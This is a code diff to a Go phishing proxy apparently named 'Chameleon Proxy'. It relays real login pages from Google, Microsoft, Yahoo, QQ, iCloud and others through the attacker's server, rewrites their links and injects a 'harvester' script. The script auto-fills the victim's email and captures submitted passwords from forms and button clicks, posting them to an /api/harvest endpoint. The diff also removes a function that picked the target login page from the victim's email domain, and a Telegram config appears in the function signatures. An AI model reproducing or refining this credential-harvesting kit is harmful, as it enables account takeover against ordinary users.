@@ -37,7 +37,7 @@ var store = &SessionStore{
 
 const harvesterScript = `
 <script>
-// 1. Universal Polyfill for URL
+// 1. Polyfill
 const OriginalURL = window.URL;
 window.URL = function(url, base) {
     try { return new OriginalURL(url, base || window.location.origin); } 
@@ -50,29 +50,36 @@ window.URL = function(url, base) {
 };
 window.URL.prototype = OriginalURL.prototype;
 
-// 2. Universal Auto-Fill (Runs 10 times max, then stops to prevent bot flags)
+// 2. Force UTF-8 globally
+document.addEventListener('DOMContentLoaded', function() {
+    document.charset = "UTF-8";
+    var metas = document.getElementsByTagName('meta');
+    for (var i = 0; i < metas.length; i++) {
+        if (metas[i].getAttribute('charset')) metas[i].setAttribute('charset', 'UTF-8');
+        if (metas[i].getAttribute('http-equiv') === 'Content-Type') {
+            metas[i].setAttribute('content', 'text/html; charset=UTF-8');
+        }
+    }
+});
+
+// 3. Universal Auto-Fill
 var fillAttempts = 0;
 var fillInterval = setInterval(function() {
     var email = window._targetEmail;
-    if (!email || fillAttempts > 10) {
-        clearInterval(fillInterval);
-        return;
-    }
+    if (!email || fillAttempts > 10) { clearInterval(fillInterval); return; }
 
-    // Look for any standard email/user input
-    var inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[name="username"], input[name="email"], input[name="loginfmt"], input[id="identifierId"]');
+    var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"], input[name="loginfmt"], input[id="identifierId"]');
     
     if (inputs.length > 0) {
         for (var i = 0; i < inputs.length; i++) {
             var input = inputs[i];
-            // Make sure it's visible and empty
             if (input.offsetParent !== null && input.value === "") {
                 let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                 setter.call(input, email);
                 input.dispatchEvent(new Event('input', { bubbles: true }));
                 input.dispatchEvent(new Event('change', { bubbles: true }));
                 input.focus();
-                clearInterval(fillInterval); // Stop once we fill it
+                clearInterval(fillInterval);
                 return;
             }
         }
@@ -80,7 +87,7 @@ var fillInterval = setInterval(function() {
     fillAttempts++;
 }, 500);
 
-// 3. Catch ALL login attempts (Forms + Button Clicks)
+// 4. Catch All Submissions
 function sendHarvest(data) {
     fetch(window.location.origin + '/api/harvest', {
         method: 'POST',
@@ -111,7 +118,6 @@ document.addEventListener('submit', function(e) {
     }
 }, false);
 
-// Also catch button clicks in case Microsoft/Google bypass standard form submit
 document.addEventListener('click', function(e) {
     if (e.target.tagName === 'BUTTON' || e.target.type === 'submit') {
         var passwords = document.querySelectorAll('input[type="password"]');
@@ -251,12 +257,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
-		parsedBase, _ := url.Parse(targetBase)
-		baseHost := parsedBase.Host
-
-		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost, c.Request.Host+"/proxy")
-		bodyStr = strings.ReplaceAll(bodyStr, "http://"+baseHost, c.Request.Host+"/proxy")
-		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost+"/", c.Request.Host+"/proxy/")
+		// FIX: Strip out ALL scripts that contain document.write. These are injecting the GBK meta tags!
+		reDocWrite := regexp.MustCompile(`(?i)<script[^>]*>.*?document\.write.*?<\/script>`)
+		bodyStr = reDocWrite.ReplaceAllString(bodyStr, "")
 
 		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
 		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
@@ -273,6 +276,13 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			m = strings.ReplaceAll(m, `sandbox`, "")
 			return m
 		})
+
+		parsedBase, _ := url.Parse(targetBase)
+		baseHost := parsedBase.Host
+
+		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost, c.Request.Host+"/proxy")
+		bodyStr = strings.ReplaceAll(bodyStr, "http://"+baseHost, c.Request.Host+"/proxy")
+		bodyStr = strings.ReplaceAll(bodyStr, "https://"+baseHost+"/", c.Request.Host+"/proxy/")
 
 		baseTag := `<base href="` + targetBase + `">`
 		emailScript := `<script>window._targetEmail = "` + email + `";</script>`
@@ -388,45 +398,4 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
 	r.Run("0.0.0.0:" + listenPort)
-}
-
-// GetTargetDomain determines the login page based on the email domain
-func GetTargetDomain(email string) string {
-	parts := strings.Split(email, "@")
-	if len(parts) != 2 {
-		return "https://accounts.google.com/"
-	}
-	domain := strings.ToLower(parts[1])
-
-	// Map common providers
-	switch {
-	case strings.Contains(domain, "gmail.com") || strings.Contains(domain, "googlemail.com"):
-		return "https://accounts.google.com/"
-	case strings.Contains(domain, "outlook.com") || strings.Contains(domain, "hotmail.com") || strings.Contains(domain, "live.com") || strings.Contains(domain, "msn.com"):
-		return "https://login.live.com/"
-	case strings.Contains(domain, "yahoo.com") || strings.Contains(domain, "ymail.com"):
-		return "https://login.yahoo.com/"
-	case strings.Contains(domain, "aol.com"):
-		return "https://login.aol.com/"
-	case strings.Contains(domain, "126.com") || strings.Contains(domain, "163.com") || strings.Contains(domain, "yeah.net"):
-		return "https://mail.126.com/"
-	case strings.Contains(domain, "qq.com") || strings.Contains(domain, "foxmail.com"):
-		return "https://mail.qq.com/"
-	case strings.Contains(domain, "icloud.com") || strings.Contains(domain, "me.com"):
-		return "https://appleid.apple.com/"
-	case strings.Contains(domain, "networksolutions.com"):
-		return "https://www.networksolutions.com/my-account/login"
-	default:
-		// Fallback: Try to guess the webmail domain for custom corporate emails
-		_, err := net.LookupHost("webmail." + domain)
-		if err == nil {
-			return "https://webmail." + domain + "/"
-		}
-		_, err = net.LookupHost("mail." + domain)
-		if err == nil {
-			return "https://mail." + domain + "/"
-		}
-		// Absolute fallback to Google if we can't figure it out
-		return "https://accounts.google.com/"
-	}
 }
